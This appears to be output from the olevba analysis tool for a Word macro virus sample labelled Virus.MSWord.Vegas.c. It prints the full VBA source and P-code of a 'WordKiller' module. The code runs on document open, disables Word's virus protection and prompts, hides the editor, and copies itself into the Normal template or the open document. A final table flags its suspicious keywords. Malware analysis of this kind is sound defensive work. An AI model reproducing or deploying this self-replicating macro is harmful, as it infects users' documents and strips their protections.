olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vegas.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vegas.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordKiller.bas 
in file: Virus.MSWord.Vegas.c - OLE stream: 'Macros/VBA/WordKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 2001 by ONO.
'All rights reserved.
'Anti WordKiller
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRD010^.tmp"
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
Rem    Application.Run MacroName:="Normal.WordKiller.ToolsMacro"
'èùåì â àêòèâíîì äîêóìåíòå
 _
 _
        
End If
Next i
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
Rem    Application.Run MacroName:="Normal.WordKiller.ToolsMacro"
'èùåì â àêòèâíîì äîêóìåíòå
 _
 _
        
End If
Next i
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordKiller" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
MsgBox "Äîêóìåíò âàêöèíèðîâàí ïðîòèâ âèðóñîâ WordKiller è WordDigger" + vbCrLf + "", vbOKOnly + vbInformation
End Sub
Sub ViewVBCode()
If Dir("c:\killer.my") = "" Then
FatalAppExit 0, "ß íå äóìàþ ÷òî ýòî òåáå íóæíî!"
Else
Application.VBE.MainWindow.Visible = True
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vegas.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/WordKiller - 4391 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn NStat
' Line #2:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn VStat
' Line #3:
' 	QuoteRem 0x0000 0x0018 "Copyright © 2001 by ONO."
' Line #4:
' 	QuoteRem 0x0000 0x0014 "All rights reserved."
' Line #5:
' 	QuoteRem 0x0000 0x000F "Anti WordKiller"
' Line #6:
' 	FuncDefn (Public Declare Sub FatalAppExit Lib "kernel32" (ByVal uAction As Long, ByVal lpMessageText As String))
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	Dim 
' 	VarDefn pth (As String)
' 	VarDefn i (As Byte)
' 	VarDefn dc (As Object)
' Line #13:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #16:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRD010^.tmp"
' 	Concat 
' 	St pth 
' Line #17:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordKiller"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Rem 0x003D "    Application.Run MacroName:="Normal.WordKiller.ToolsMacro""
' Line #21:
' 	QuoteRem 0x0000 0x0019 "èùåì â àêòèâíîì äîêóìåíòå"
' Line #22:
' 	LineCont 0x0008 00 00 00 00 00 00 08 00
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Rem 0x003D "    Application.Run MacroName:="Normal.WordKiller.ToolsMacro""
' Line #28:
' 	QuoteRem 0x0000 0x0019 "èùåì â àêòèâíîì äîêóìåíòå"
' Line #29:
' 	LineCont 0x0008 00 00 00 00 00 00 08 00
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #34:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordKiller"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	St NInst 
' Line #36:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordKiller"
' 	Eq 
' 	IfBlock 
' Line #42:
' 	LitDI2 0x0001 
' 	St AInst 
' Line #43:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set dc 
' 	EndIf 
' Line #47:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' 	EndIf 
' Line #48:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #49:
' 	Ld pth 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #51:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	LitStr 0x003C "Äîêóìåíò âàêöèíèðîâàí ïðîòèâ âèðóñîâ WordKiller è WordDigger"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub ViewVBCode())
' Line #56:
' 	LitStr 0x000C "c:\killer.my"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0000 
' 	LitStr 0x001E "ß íå äóìàþ ÷òî ýòî òåáå íóæíî!"
' 	ArgsCall FatalAppExit 0x0002 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

